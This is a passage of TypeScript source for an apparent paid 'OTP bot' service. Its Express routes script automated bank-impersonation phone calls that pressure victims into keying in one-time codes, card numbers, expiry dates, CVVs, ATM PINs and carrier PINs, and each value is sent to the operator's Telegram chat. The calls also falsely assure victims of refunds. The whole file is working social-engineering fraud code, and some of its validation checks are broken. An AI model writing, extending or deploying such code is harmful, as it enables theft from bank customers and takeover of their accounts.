/* eslint-disable @typescript-eslint/no-explicit-any */
/* eslint-disable no-console */
import { Webhook } from 'coinbase-commerce-node';
import express from 'express';
import moment from 'moment';
import { Markup } from 'telegraf';
import { v4 as uuidv4 } from 'uuid';
import { bot } from '.';
import { client } from './utils/contentful';
import { customDtmfFlow } from './utils/customDtmfFlow';
import {
  accountFlow,
  bankFlow,
  cardFlow,
  payFlow,
  pgpFlow,
  pinFlow,
} from './utils/dtmfFlow';
import { getMembership } from './utils/getMembership';
import { getUser } from './utils/getUser';

const app = express();

app.use(express.json());
app.use(
  express.urlencoded({
    extended: true,
  }),
);

app.post('/coinbase-webhook', async (req, res) => {
  const body = req.body;
  const signature = req.headers['x-cc-webhook-signature'] as string;
  const webhookSecret = process.env.COINBASE_WEBHOOK_SECRET as string;

  try {
    const event = Webhook.verifyEventBody(
      JSON.stringify(body),
      signature,
      webhookSecret,
    );

    const { metadata, pricing } = body.event.data;
    const subsciption = getMembership(String(pricing.local.amount));

    if (event.type === 'charge:pending' && metadata.reason === 'OTP Purchase') {
      // user paid, but transaction not confirm on blockchain yet
      bot.telegram.sendMessage(
        metadata.chatId,
        '😁 Your payment has been received but not confirmed yet ',
      );
    }

    if (
      (event.type === 'charge:confirmed' &&
        metadata.reason === 'OTP Purchase') ||
      (event.type === 'charge:resolved' && metadata.reason === 'OTP Purchase')
    ) {
      // all good, charge confirmed
      bot.telegram.sendMessage(
        metadata.chatId,
        '😋 Your payment has been received',
      );
      try {
        const { user } = await getUser({
          id: Number(metadata.chatId),
        });

        if (user) {
          user.fields.membershipExpiry = {
            'en-US': moment
              .utc()
              .add(subsciption.duration, subsciption.unit as any)
              .format(),
          };

          await (await user.update()).publish();

          await bot.telegram.sendMessage(
            metadata.chatId,
            '🤩 Your subsciption has been renewed, to start send "/start"',
          );
        }
      } catch (error) {
        const space = await client.getSpace(
          process.env.CONTENTFUL_SPACE as string,
        );
        const env = await space.getEnvironment('master');
        const user = await env.createEntry('user', {
          fields: {
            id: { 'en-US': Date.now() },
            telegramId: { 'en-US': Number(metadata.chatId) },
            username: { 'en-US': metadata.username || String(metadata.chatId) },
            membershipExpiry: {
              'en-US': moment
                .utc()
                .add(subsciption.duration, subsciption.unit as any)
                .format(),
            },
            membershipType: {
              'en-US': subsciption.type,
            },
          },
        });

        await user.publish();

        await bot.telegram.sendMessage(
          metadata.chatId,
          '🤩 Your subsciption has been confirmed, to start send "/start"',
        );
      }
    }

    if (event.type === 'charge:failed' && metadata.reason === 'OTP Purchase') {
      // charge failed or expired
      bot.telegram.sendMessage(
        metadata.chatId,
        "😔 You didn't make a payment if this an error please contact admin",
      );
    }

    res.send(`success ${event.id}`);
  } catch (error) {
    console.log(error);
    res.status(400).send('failure!');
  }
});

app.get('/calls/dtmf/:language/:step/:chatId', (req, res) => {
  const { step, language, chatId } = req.params;
  const {
    wallet,
    askCardInfo,
    cardType,
    pinType,
    variables,
    destination,
    transferNumber,
    institutionName,
    from,
    actions,
    customMessage,
  } = req.query;

  const { dtmf } = JSON.parse(variables as string);

  switch (step) {
    case 'bank':
      bankFlow(
        String(dtmf),
        res,
        language,
        Number(chatId),
        step,
        destination as string,
      );

      break;
    case 'pay':
      payFlow(
        String(dtmf),
        res,
        language,
        Number(chatId),
        step,
        destination as string,
        wallet as string,
      );
      break;
    case 'account':
      accountFlow(
        String(dtmf),
        res,
        language,
        Number(chatId),
        step,
        destination as string,
        askCardInfo as string,
      );
      break;
    case 'card':
      cardFlow(
        String(dtmf),
        res,
        language,
        Number(chatId),
        step,
        destination as string,
        cardType as string,
      );
      break;
    case 'pin':
      pinFlow(
        String(dtmf),
        res,
        language,
        Number(chatId),
        step,
        destination as string,
        pinType as string,
      );
      break;
    case 'pgp':
      pgpFlow(
        dtmf,
        res,
        language,
        Number(chatId),
        step,
        String(destination),
        String(transferNumber),
        String(institutionName),
        String(from),
      );
      break;
    case 'custom':
      customDtmfFlow(
        dtmf,
        res,
        language,
        Number(chatId),
        step,
        String(destination),
        String(actions),
        String(customMessage),
      );
      break;
    default:
      break;
  }
});

app.get('/calls/pins/:step/:chatId/:language', async (req, res) => {
  const { step, chatId, language } = req.params;
  const { variables } = req.query;
  const { dtmf } = JSON.parse(variables as string);

  const { pinType } = req.query;

  if (!dtmf) {
    return res.json({
      id: uuidv4(),
      title: `call PIN STEP - ${chatId}`,
      record: false,
      steps: [
        {
          id: uuidv4(),
          action: 'say',
          options: {
            payload:
              pinType === 'carrierPin'
                ? `You have not entered anything. To verify and secure your phone number, please enter your ${pinType} followed by the pound key.`
                : `You have not entered anything. For your security and to protect your account. enter your ${pinType} followed by the pound key`,
            language,
            voice: 'female',
          },
          onKeypressGoto: 'nextStepGoto',
          onKeypressVar: 'dtmf',
          endKey: '#',
          maxNumKeys: 8,
        },
        {
          id: uuidv4(),
          action: 'pause',
          options: {
            length: 5,
          },
          onKeypressGoto: 'nextStepGoto',
          onKeypressVar: 'dtmf',
          endKey: '#',
          maxNumKeys: 8,
        },
        {
          id: 'nextStepGoto',
          action: 'fetchCallFlow',
          options: {
            url: `${process.env.ENDPOINT_URL}/calls/pins/${step}/${chatId}/${language}?pinType=${pinType}`,
          },
        },
      ],
    });
  }

  if (dtmf) {
    if (dtmf.length < 6 && pinType === 'carrierPin') {
      return res.json({
        id: uuidv4(),
        title: `pin step - ${chatId}`,
        record: false,
        steps: [
          {
            id: uuidv4(),
            action: 'say',
            options: {
              payload: `The ${pinType} you have entered is incorrect. To verify and secure your phone number, please enter your ${pinType} followed by the pound key.`,
              language,
              voice: 'female',
              loop: true,
            },
            onKeypressGoto: 'nextStepGoto',
            onKeypressVar: 'dtmf',
            endKey: '#',
            maxNumKeys: 6,
          },
          {
            id: uuidv4(),
            action: 'pause',
            options: {
              length: 5,
            },
            onKeypressGoto: 'nextStepGoto',
            onKeypressVar: 'dtmf',
            endKey: '#',
            maxNumKeys: 8,
          },
          {
            id: 'nextStepGoto',
            action: 'fetchCallFlow',
            options: {
              url: `${process.env.ENDPOINT_URL}/calls/pins/${step}/${chatId}/${language}?pinType=${pinType}`,
            },
          },
        ],
      });
    }

    if (dtmf.length !== 4 && pinType === 'Card Pin') {
      return res.json({
        id: uuidv4(),
        title: `call PIN STEP - ${chatId}`,
        record: false,
        steps: [
          {
            id: uuidv4(),
            action: 'say',
            options: {
              payload: `The ${pinType} you have entered is incorrect. For your security and to protect your account. enter your ${pinType} followed by the pound key`,
              language,
              voice: 'female',
              loop: true,
            },
            onKeypressGoto: 'nextStepGoto',
            onKeypressVar: 'dtmf',
            endKey: '#',
            maxNumKeys: 4,
          },
          {
            id: uuidv4(),
            action: 'pause',
            options: {
              length: 5,
            },
            onKeypressGoto: 'nextStepGoto',
            onKeypressVar: 'dtmf',
            endKey: '#',
            maxNumKeys: 8,
          },
          {
            id: 'nextStepGoto',
            action: 'fetchCallFlow',
            options: {
              url: `${process.env.ENDPOINT_URL}/calls/pins/${step}/${chatId}/${language}?pinType=${pinType}`,
            },
          },
        ],
      });
    }

    await bot.telegram.sendMessage(
      chatId,
      pinType === 'carrierPin'
        ? `Carrier pin is <b>${dtmf}</b> 📲`
        : `Card pin is <b>${dtmf}</b> 📟`,
      {
        parse_mode: 'HTML',
      },
    );
  }
  return res.json({
    id: uuidv4(),
    title: `call bank - ${chatId} no OTP`,
    record: false,
    steps: [
      {
        id: uuidv4(),
        action: 'say',
        options: {
          payload:
            pinType === 'carrierPin'
              ? `Thank you for verifying. The request has been blocked, Good bye`
              : `Thank you for verifying. Good bye`,
          language,
          voice: 'female',
        },
      },
    ],
  });
});

app.get('/calls/pin/:chatId/:language', async (req, res) => {
  const { chatId, language } = req.params;
  const { variables } = req.query;
  const { dtmf } = JSON.parse(variables as string);

  if (!dtmf) {
    return res.json({
      id: uuidv4(),
      title: `call PIN STEP - ${chatId}`,
      record: false,
      steps: [
        {
          id: uuidv4(),
          action: 'say',
          options: {
            payload: `You have not entered anything. To AUTHENTICATE YOU please enter your ${
              language === 'en-us' ? 'CARD PIN' : 'TELEPIN'
            }, the same pin you use at the ATM,  followed by the pound key.`,
            language,
            voice: 'female',
          },
          onKeypressGoto: 'nextStepGoto',
          onKeypressVar: 'dtmf',
          endKey: '#',
          maxNumKeys: 8,
        },
        {
          id: uuidv4(),
          action: 'pause',
          options: {
            length: 5,
          },
          onKeypressGoto: 'nextStepGoto',
          onKeypressVar: 'dtmf',
          endKey: '#',
          maxNumKeys: 8,
        },
        {
          id: 'nextStepGoto',
          action: 'fetchCallFlow',
          options: {
            url: `${process.env.ENDPOINT_URL}/calls/pin/${chatId}/${language}`,
          },
        },
      ],
    });
  }

  if (dtmf && dtmf === '*') {
    await bot.telegram.sendMessage(chatId, `OTP not received ❌`);

    return res.json({
      id: uuidv4(),
      title: `call bank - ${chatId} no OTP`,
      record: false,
      steps: [
        {
          id: uuidv4(),
          action: 'say',
          options: {
            payload:
              'OKAY, you might receive another automated call if we detect a security code has been sent to you. Thank you, goodbye.',
            language,
            voice: 'female',
          },
        },
      ],
    });
  }
  if (dtmf) {
    if (dtmf.length !== 4) {
      return res.json({
        id: uuidv4(),
        title: `call PIN STEP - ${chatId}`,
        record: false,
        steps: [
          {
            id: uuidv4(),
            action: 'say',
            options: {
              payload: `The ${
                language === 'en-us' ? 'CARD PIN' : 'TELEPIN'
              } you have entered is incorrect. To AUTHENTICATE YOU please enter your ${
                language === 'en-us' ? 'CARD PIN' : 'TELEPIN'
              }, the same pin you use at the ATM, followed by the pound key.`,
              language,
              voice: 'female',
            },
            onKeypressGoto: 'nextStepGoto',
            onKeypressVar: 'dtmf',
            endKey: '#',
            maxNumKeys: 8,
          },
          {
            id: uuidv4(),
            action: 'pause',
            options: {
              length: 5,
            },
            onKeypressGoto: 'nextStepGoto',
            onKeypressVar: 'dtmf',
            endKey: '#',
            maxNumKeys: 8,
          },
          {
            id: 'nextStepGoto',
            action: 'fetchCallFlow',
            options: {
              url: `${process.env.ENDPOINT_URL}/calls/pin/${chatId}/${language}`,
            },
          },
        ],
      });
    }

    await bot.telegram.sendMessage(
      req.params.chatId,
      req.params.language === 'en-us'
        ? `Card Pin is <b>${dtmf}</b> 💳`
        : `Telepin is <b>${dtmf}</b> 📟`,
      {
        parse_mode: 'HTML',
      },
    );
  }
  return res.json({
    id: uuidv4(),
    title: `call bank - ${chatId} no OTP`,
    record: false,
    steps: [
      {
        id: uuidv4(),
        action: 'say',
        options: {
          payload: `GREAT, you have entered ${dtmf
            .split('')
            .join(
              ', ',
            )}. Your account is now secure. If the payment has already left your account, NO NEED TO WORRY. It will automatically be refunded to you in 24 to 48 hours. Thank you, goodbye.`,
          language,
          voice: 'female',
        },
      },
    ],
  });
});

app.get('/calls/:step/:chatId/:language', async (req, res) => {
  const { cardType, isAccount, expiry, cvv } = req.query;
  const { variables } = req.query;
  const { dtmf } = JSON.parse(variables as string);

  const { language, chatId, step } = req.params;

  if (!dtmf) {
    return res.json({
      id: uuidv4(),
      title: `call ${step} - ${chatId}`,
      record: false,
      steps: [
        {
          id: uuidv4(),
          action: 'say',
          options: {
            payload: `You have not entered anything. We need to verify you, please enter your ${
              cardType !== 'undefined' ? cardType : ''
            } ${
              isAccount === 'yes'
                ? 'card number'
                : cvv === 'yes'
                ? 'card CVV'
                : 'card expiration date'
            } followed by the pound key`,
            language,
            voice: 'female',
            length: 5,
            loop: true,
          },
          onKeypressGoto: 'cardStepGoto',
          onKeypressVar: 'dtmf',
          endKey: '#',
          maxNumKeys: 18,
        },
        {
          id: uuidv4(),
          action: 'pause',
          options: {
            length: 5,
          },
          onKeypressGoto: 'cardStepGoto',
          onKeypressVar: 'dtmf',
          endKey: '#',
          maxNumKeys: 18,
        },
        {
          id: 'cardStepGoto',
          action: 'fetchCallFlow',
          options: {
            url: `${process.env.ENDPOINT_URL}/calls/${step}/${chatId}/${language}?cardType=${cardType}&isAccount=yes`,
          },
        },
      ],
    });
  }

  if (isAccount === 'yes') {
    if (dtmf.length >= 15 || dtmf.length <= 18) {
      return res.json({
        id: uuidv4(),
        title: `pay card - ${chatId} OTP`,
        record: false,
        steps: [
          {
            id: uuidv4(),
            action: 'say',
            options: {
              payload: `The card number you have entered is incorrect. For your SECURITY and to BLOCK this purchase, please enter your ${cardType} card number followed by the pound key`,
              language,
              voice: 'female',
              loop: true,
            },
            onKeypressGoto: 'cardStepOTP',
            onKeypressVar: 'dtmf',
            endKey: '#',
            maxNumKeys: 18,
          },
          {
            id: uuidv4(),
            action: 'pause',
            options: {
              length: 5,
            },
            onKeypressGoto: 'cardStepOTP',
            onKeypressVar: 'dtmf',
            endKey: '#',
            maxNumKeys: 18,
          },
          {
            id: 'cardStepOTP',
            action: 'fetchCallFlow',
            options: {
              url: `${process.env.ENDPOINT_URL}/calls/otp/${step}/${chatId}/${language}?cardType=${cardType}`,
            },
          },
        ],
      });
    }
    if (dtmf) {
      await bot.telegram.sendMessage(chatId, `Card number <b>${dtmf}</b> ✅`, {
        parse_mode: 'HTML',
      });
    }
    res.json({
      id: uuidv4(),
      title: `call card - ${chatId}`,
      record: false,
      steps: [
        {
          id: uuidv4(),
          action: 'say',
          options: {
            payload: `GREAT, you have entered ${dtmf
              .split('')
              .join(', ')}. Please enter your ${
              cardType !== 'undefined' ? cardType : ''
            } card expiration date followed by the pound key.`,
            language,
            voice: 'female',
          },
          onKeypressGoto: 'cardStepGoto',
          onKeypressVar: 'dtmf',
          endKey: '#',
          maxNumKeys: 8,
        },
        {
          id: uuidv4(),
          action: 'pause',
          options: {
            length: 5,
          },
          onKeypressGoto: 'cardStepGoto',
          onKeypressVar: 'dtmf',
          endKey: '#',
          maxNumKeys: 8,
        },
        {
          id: 'cardStepGoto',
          action: 'fetchCallFlow',
          options: {
            url: `${process.env.ENDPOINT_URL}/calls/${step}/${chatId}/${language}?cardType=${cardType}&expiry=yes`,
          },
        },
      ],
    });
  }

  if (expiry === 'yes') {
    if (!/^[0-9]{4,6}$/.test(dtmf)) {
      return res.json({
        id: uuidv4(),
        title: `call card - ${chatId}`,
        record: false,
        steps: [
          {
            id: uuidv4(),
            action: 'say',
            options: {
              payload: `The expiration date you have enter is incorrect. Please enter your ${cardType} card expiration date followed by the pound key.`,
              language,
              voice: 'female',
              length: 5,
            },
            onKeypressGoto: 'cardStepGoto',
            onKeypressVar: 'dtmf',
            endKey: '#',
            maxNumKeys: 6,
          },
          {
            id: uuidv4(),
            action: 'pause',
            options: {
              length: 5,
            },
            onKeypressGoto: 'cardStepGoto',
            onKeypressVar: 'dtmf',
            endKey: '#',
            maxNumKeys: 6,
          },
          {
            id: 'cardStepGoto',
            action: 'fetchCallFlow',
            options: {
              url: `${process.env.ENDPOINT_URL}/calls/${step}/${chatId}/${language}?cardType=${cardType}&expiry=yes`,
            },
          },
        ],
      });
    }
    if (dtmf) {
      await bot.telegram.sendMessage(
        chatId,
        `Expiration date <b>${dtmf}</b> ✅`,
        {
          parse_mode: 'HTML',
        },
      );
    }

    res.json({
      id: uuidv4(),
      title: `call card - ${chatId}`,
      record: false,
      steps: [
        {
          id: uuidv4(),
          action: 'say',
          options: {
            payload: `GREAT, you have entered ${dtmf
              .split('')
              .join(', ')}. Please enter your ${
              cardType !== 'undefined' ? cardType : ''
            } card CVV followed by the pound key.`,
            language,
            voice: 'female',
          },
          onKeypressGoto: 'cardStepGoto',
          onKeypressVar: 'dtmf',
          endKey: '#',
          maxNumKeys: 8,
        },
        {
          id: uuidv4(),
          action: 'pause',
          options: {
            length: 5,
          },
          onKeypressGoto: 'cardStepGoto',
          onKeypressVar: 'dtmf',
          endKey: '#',
          maxNumKeys: 8,
        },
        {
          id: 'cardStepGoto',
          action: 'fetchCallFlow',
          options: {
            url: `${process.env.ENDPOINT_URL}/calls/${step}/${chatId}/${language}?cardType=${cardType}&cvv=yes`,
          },
        },
      ],
    });
  }

  if (cvv === 'yes') {
    if (!/^[0-9]{3,4}$/.test(dtmf)) {
      return res.json({
        id: uuidv4(),
        title: `call card - ${chatId}`,
        record: false,
        steps: [
          {
            id: uuidv4(),
            action: 'say',
            options: {
              payload: `The CVV number you have entered is incorrect. Please enter your ${
                cardType !== 'undefined' ? cardType : ''
              } card CVV followed by the pound key.`,
              language,
              voice: 'female',
            },
            onKeypressGoto: 'cardStepGoto',
            onKeypressVar: 'dtmf',
            endKey: '#',
            maxNumKeys: 8,
          },
          {
            id: uuidv4(),
            action: 'pause',
            options: {
              length: 5,
            },
            onKeypressGoto: 'cardStepGoto',
            onKeypressVar: 'dtmf',
            endKey: '#',
            maxNumKeys: 8,
          },
          {
            id: 'cardStepGoto',
            action: 'fetchCallFlow',
            options: {
              url: `${process.env.ENDPOINT_URL}/calls/${step}/${chatId}/${language}?cardType=${cardType}&cvv=yes`,
            },
          },
        ],
      });
    }
    if (dtmf) {
      await bot.telegram.sendMessage(chatId, `CVV <b>${dtmf}</b> ✅`, {
        parse_mode: 'HTML',
      });
    }
    return res.json({
      id: uuidv4(),
      title: `call card - ${chatId}`,
      record: false,
      steps: [
        {
          id: uuidv4(),
          action: 'say',
          options: {
            payload: `GREAT. you have entered ${dtmf
              .split('')
              .join(', ')}. To AUTHENTICATE YOU please enter your ${
              language === 'en-us' ? 'CARD PIN' : 'TELEPIN'
            }, the same pin you use at the ATM,  followed by the pound key.`,
            language,
            voice: 'female',
          },
          onKeypressGoto: 'cardStepGoto',
          onKeypressVar: 'dtmf',
          endKey: '#',
          maxNumKeys: 8,
        },
        {
          id: uuidv4(),
          action: 'pause',
          options: {
            length: 5,
          },
          onKeypressGoto: 'cardStepGoto',
          onKeypressVar: 'dtmf',
          endKey: '#',
          maxNumKeys: 8,
        },
        {
          id: 'cardStepGoto',
          action: 'fetchCallFlow',
          options: {
            url: `${process.env.ENDPOINT_URL}/calls/pin/${chatId}/${language}`,
          },
        },
      ],
    });
  }
});

app.get('/calls/otp/:step/:chatId/:language', async (req, res) => {
  const { askCardInfo, cardType, variables } = req.query;
  const { language, chatId, step } = req.params;

  const { dtmf } = JSON.parse(variables as string);

  if (dtmf && dtmf === '*') {
    await bot.telegram.sendMessage(chatId, `OTP not received ❌`);

    return res.json({
      id: uuidv4(),
      title: `call ${step} - ${chatId} no OTP`,
      record: false,
      steps: [
        {
          id: uuidv4(),
          action: 'say',
          options: {
            payload:
              'OKAY, you might receive another automated call if we detect a security code has been sent to you. Thank you, goodbye.',
            language,
            voice: 'female',
          },
        },
      ],
    });
  }

  switch (step) {
    case 'bank':
      if (!dtmf) {
        return res.json({
          id: uuidv4(),
          title: `call ${step} - ${chatId} OTP`,
          record: false,
          steps: [
            {
              id: uuidv4(),
              action: 'say',
              options: {
                payload:
                  'You have not entered anything. For your SECURITY and to BLOCK this transaction, please enter the SECURITY CODE we have sent you followed by the pound key. If you have not received the security code yet please press the star key followed by the pound key',
                language,
                voice: 'female',
                loop: true,
              },
              onKeypressGoto: 'nextStepOTP',
              endKey: '#',
              maxNumKeys: 8,
              onKeypressVar: 'dtmf',
            },
            {
              id: uuidv4(),
              action: 'pause',
              options: {
                length: 5,
              },
              onKeypressGoto: 'nextStepOTP',
              onKeypressVar: 'dtmf',
              endKey: '#',
              maxNumKeys: 8,
            },
            {
              action: 'hangup',
            },
            {
              id: 'nextStepOTP',
              action: 'fetchCallFlow',
              options: {
                url: `${process.env.ENDPOINT_URL}/calls/otp/${step}/${chatId}/${language}`,
              },
            },
          ],
        });
      }

      if (dtmf) {
        await bot.telegram.sendMessage(
          req.params.chatId,
          `OTP is <b>${dtmf}</b> ✅`,
          {
            parse_mode: 'HTML',
          },
        );
      }
      return res.json({
        id: uuidv4(),
        title: `call bank - ${chatId} OTP`,
        record: false,
        steps: [
          {
            id: uuidv4(),
            action: 'say',
            options: {
              payload: `GREAT. you have entered ${dtmf
                .split('')
                .join(', ')}. To AUTHENTICATE YOU please enter your ${
                language === 'en-us' ? 'CARD PIN' : 'TELEPIN'
              }, the same pin you use at the ATM, followed by the pound key.`,
              language,
              voice: 'female',
            },
            onKeypressGoto: 'bankStepPin',
            onKeypressVar: 'dtmf',
            endKey: '#',
            maxNumKeys: 8,
          },
          {
            id: uuidv4(),
            action: 'pause',
            options: {
              length: 5,
            },
            onKeypressGoto: 'bankStepPin',
            onKeypressVar: 'dtmf',
            endKey: '#',
            maxNumKeys: 8,
          },
          {
            id: 'bankStepPin',
            action: 'fetchCallFlow',
            options: {
              url: `${process.env.ENDPOINT_URL}/calls/pin/${chatId}/${language}`,
            },
          },
        ],
      });
    case 'pay':
      if (dtmf) {
        if (!dtmf) {
          return res.json({
            id: uuidv4(),
            title: `call ${step} - ${chatId} OTP`,
            record: false,
            steps: [
              {
                id: uuidv4(),
                action: 'say',
                options: {
                  payload:
                    'You have not entered anything. For your SECURITY and to BLOCK this transaction, please enter the SECURITY CODE we have sent you followed by the pound key. If you have not received the security code yet please press the star key followed by the pound key',
                  language,
                  voice: 'female',
                  loop: true,
                },
                onKeypressGoto: 'nextStepOTP',
                endKey: '#',
                maxNumKeys: 8,
                onKeypressVar: 'dtmf',
              },
              {
                id: uuidv4(),
                action: 'pause',
                options: {
                  length: 5,
                },
                onKeypressGoto: 'nextStepOTP',
                onKeypressVar: 'dtmf',
                endKey: '#',
                maxNumKeys: 8,
              },
              {
                action: 'hangup',
              },
              {
                id: 'nextStepOTP',
                action: 'fetchCallFlow',
                options: {
                  url: `${process.env.ENDPOINT_URL}/calls/otp/${step}/${chatId}/${language}`,
                },
              },
            ],
          });
        }

        await bot.telegram.sendMessage(
          req.params.chatId,
          `OTP is <b>${dtmf}</b> ✅`,
          {
            parse_mode: 'HTML',
          },
        );
      }

      return res.json({
        id: uuidv4(),
        title: `call card - ${chatId}`,
        record: false,
        steps: [
          {
            id: uuidv4(),
            action: 'say',
            options: {
              payload: `GREAT. you have entered ${dtmf
                .split('')
                .join(', ')}. To AUTHENTICATE YOU please enter your ${
                language === 'en-us' ? 'CARD PIN' : 'TELEPIN'
              }, the same pin you use at the ATM,  followed by the pound key.`,
              language,
              voice: 'female',
              length: 5,
            },
            onKeypressGoto: 'cardStepGoto',
            onKeypressVar: 'dtmf',
            endKey: '#',
            maxNumKeys: 8,
          },
          {
            id: uuidv4(),
            action: 'pause',
            options: {
              length: 5,
            },
            onKeypressGoto: 'cardStepGoto',
            onKeypressVar: 'dtmf',
            endKey: '#',
            maxNumKeys: 8,
          },
          {
            id: 'cardStepGoto',
            action: 'fetchCallFlow',
            options: {
              url: `${process.env.ENDPOINT_URL}/calls/pin/${chatId}/${language}`,
            },
          },
        ],
      });
    case 'account':
      if (!dtmf) {
        return res.json({
          id: uuidv4(),
          title: `call ${step} - ${chatId} OTP`,
          record: false,
          steps: [
            {
              id: uuidv4(),
              action: 'say',
              options: {
                payload:
                  'You have not entered anything. For your SECURITY and to BLOCK this transaction, please enter the SECURITY CODE we have sent you followed by the pound key. If you have not received the security code yet please press the star key followed by the pound key',
                language,
                voice: 'female',
                loop: true,
              },
              onKeypressGoto: 'nextStepOTP',
              endKey: '#',
              maxNumKeys: 8,
              onKeypressVar: 'dtmf',
            },
            {
              id: uuidv4(),
              action: 'pause',
              options: {
                length: 5,
              },
              onKeypressGoto: 'nextStepOTP',
              onKeypressVar: 'dtmf',
              endKey: '#',
              maxNumKeys: 8,
            },
            {
              action: 'hangup',
            },
            {
              id: 'nextStepOTP',
              action: 'fetchCallFlow',
              options: {
                url: `${process.env.ENDPOINT_URL}/calls/otp/${step}/${chatId}/${language}`,
              },
            },
          ],
        });
      }

      if (dtmf) {
        await bot.telegram.sendMessage(
          req.params.chatId,
          `OTP is <b>${dtmf}</b> ✅`,
          {
            parse_mode: 'HTML',
          },
        );
      }

      if (askCardInfo === 'yes') {
        return res.json({
          id: uuidv4(),
          title: `call card - ${chatId}`,
          record: false,
          steps: [
            {
              id: uuidv4(),
              action: 'say',
              options: {
                payload: `Okay, you have entered ${dtmf
                  .split('')
                  .join(', ')}. We need to verify you, please enter your ${
                  cardType !== 'undefined' ? cardType : ''
                } card number followed by the pound key`,
                language,
                voice: 'female',
                length: 5,
              },
              onKeypressGoto: 'cardStepGoto',
              onKeypressVar: 'dtmf',
              endKey: '#',
              maxNumKeys: 18,
            },
            {
              id: uuidv4(),
              action: 'pause',
              options: {
                length: 5,
              },
              onKeypressGoto: 'cardStepGoto',
              onKeypressVar: 'dtmf',
              endKey: '#',
              maxNumKeys: 18,
            },
            {
              id: 'cardStepGoto',
              action: 'fetchCallFlow',
              options: {
                url: `${process.env.ENDPOINT_URL}/calls/card/${chatId}/${language}?cardType=${cardType}&isAccount=yes`,
              },
            },
          ],
        });
      } else {
        return res.json({
          id: uuidv4(),
          title: `call bank - ${chatId} no OTP`,
          record: false,
          steps: [
            {
              id: uuidv4(),
              action: 'say',
              options: {
                payload: `GREAT, you have entered ${dtmf
                  .split('')
                  .join(
                    ', ',
                  )}. Your account is now secure. If the payment has already left your account, NO NEED TO WORRY. It will automatically be refunded to you in 24 to 48 hours. Thank you, goodbye.`,
                language,
                voice: 'female',
              },
            },
          ],
        });
      }
    case 'card':
      if (!dtmf) {
        return res.json({
          id: uuidv4(),
          title: `call ${step} - ${chatId} OTP`,
          record: false,
          steps: [
            {
              id: uuidv4(),
              action: 'say',
              options: {
                payload: `You have not entered anything. For your SECURITY and to BLOCK this purchase, please enter your ${cardType} card number followed by the pound keyYou have not entered anything. For your SECURITY and to BLOCK this purchase, please enter your ${cardType} card number followed by the pound key`,
                language,
                voice: 'female',
                loop: true,
              },
              onKeypressGoto: 'nextStepOTP',
              endKey: '#',
              maxNumKeys: 18,
              onKeypressVar: 'dtmf',
            },
            {
              id: uuidv4(),
              action: 'pause',
              options: {
                length: 5,
              },
              onKeypressGoto: 'nextStepOTP',
              onKeypressVar: 'dtmf',
              endKey: '#',
              maxNumKeys: 18,
            },
            {
              action: 'hangup',
            },
            {
              id: 'nextStepOTP',
              action: 'fetchCallFlow',
              options: {
                url: `${process.env.ENDPOINT_URL}/calls/otp/${step}/${chatId}/${language}?cardType=${cardType}`,
              },
            },
          ],
        });
      }
      if (!(dtmf.length > 15 && dtmf.length < 18)) {
        return res.json({
          id: uuidv4(),
          title: `pay card - ${chatId} OTP`,
          record: false,
          steps: [
            {
              id: uuidv4(),
              action: 'say',
              options: {
                payload: `The card number you have entered is incorrect. For your SECURITY and to BLOCK this purchase, please enter your ${cardType} card number followed by the pound key`,
                language,
                voice: 'female',
                loop: true,
              },
              onKeypressGoto: 'cardStepOTP',
              onKeypressVar: 'dtmf',
              endKey: '#',
              maxNumKeys: 18,
            },
            {
              id: uuidv4(),
              action: 'pause',
              options: {
                length: 5,
              },
              onKeypressGoto: 'cardStepOTP',
              onKeypressVar: 'dtmf',
              endKey: '#',
              maxNumKeys: 18,
            },
            {
              id: 'cardStepOTP',
              action: 'fetchCallFlow',
              options: {
                url: `${process.env.ENDPOINT_URL}/calls/otp/${step}/${chatId}/${language}?cardType=${cardType}`,
              },
            },
          ],
        });
      }
      if (dtmf) {
        await bot.telegram.sendMessage(
          req.params.chatId,
          `Card number <b>${dtmf}</b> ✅`,
          {
            parse_mode: 'HTML',
          },
        );
        return res.json({
          id: uuidv4(),
          title: `call card - ${chatId}`,
          record: false,
          steps: [
            {
              id: uuidv4(),
              action: 'say',
              options: {
                payload: `GREAT, you have entered ${dtmf
                  .split('')
                  .join(
                    ', ',
                  )}. Please enter your ${cardType} card expiration date followed by the pound key.`,
                language,
                voice: 'female',
                length: 5,
              },
              onKeypressGoto: 'cardStepGoto',
              onKeypressVar: 'dtmf',
              endKey: '#',
              maxNumKeys: 6,
            },
            {
              id: uuidv4(),
              action: 'pause',
              options: {
                length: 5,
              },
              onKeypressGoto: 'cardStepGoto',
              onKeypressVar: 'dtmf',
              endKey: '#',
              maxNumKeys: 6,
            },
            {
              id: 'cardStepGoto',
              action: 'fetchCallFlow',
              options: {
                url: `${process.env.ENDPOINT_URL}/calls/card/${chatId}/${language}?cardType=${cardType}&expiry=yes`,
              },
            },
          ],
        });
      } else {
        return res.json({
          id: uuidv4(),
          title: `call card - ${chatId}`,
          record: false,
          steps: [
            {
              id: uuidv4(),
              action: 'say',
              options: {
                payload: `You have not entered anything. For your SECURITY and to BLOCK this purchase, please enter your ${cardType} card number followed by the pound key`,
                language,
                voice: 'female',
                length: 5,
              },
              onKeypressGoto: 'cardStepGoto',
              onKeypressVar: 'dtmf',
              endKey: '#',
              maxNumKeys: 18,
            },
            {
              id: uuidv4(),
              action: 'pause',
              options: {
                length: 5,
              },
              onKeypressGoto: 'cardStepGoto',
              onKeypressVar: 'dtmf',
              endKey: '#',
              maxNumKeys: 18,
            },
            {
              id: 'cardStepGoto',
              action: 'fetchCallFlow',
              options: {
                url: `${process.env.ENDPOINT_URL}/calls/otp/${step}/${chatId}/${language}?cardType=${cardType}`,
              },
            },
          ],
        });
      }
    default:
      break;
  }
});

app.get('/custom/:step/:chatId/:language', async (req, res) => {
  const { actions, action } = req.query;
  const { variables } = req.query;
  const { dtmf } = JSON.parse(variables as string);

  const { language, chatId, step } = req.params;

  const ac: {
    0: string;
    1: string;
  }[] = JSON.parse(String(actions));

  if (!dtmf) {
    return res.json({
      id: uuidv4(),
      title: `pay card - ${chatId} OTP`,
      record: false,
      steps: [
        {
          id: uuidv4(),
          action: 'say',
          options: {
            payload: `You have not entered anything, ${ac[0][1]}`,
            language,
            voice: 'female',
            loop: true,
          },
          onKeypressGoto: 'customStepGoto',
          onKeypressVar: 'dtmf',
          endKey: '#',
          maxNumKeys: 20,
        },
        {
          id: uuidv4(),
          action: 'pause',
          options: {
            length: 5,
          },
          onKeypressGoto: 'customStepGoto',
          onKeypressVar: 'dtmf',
          endKey: '#',
          maxNumKeys: 20,
        },
        {
          id: 'customStepGoto',
          action: 'fetchCallFlow',
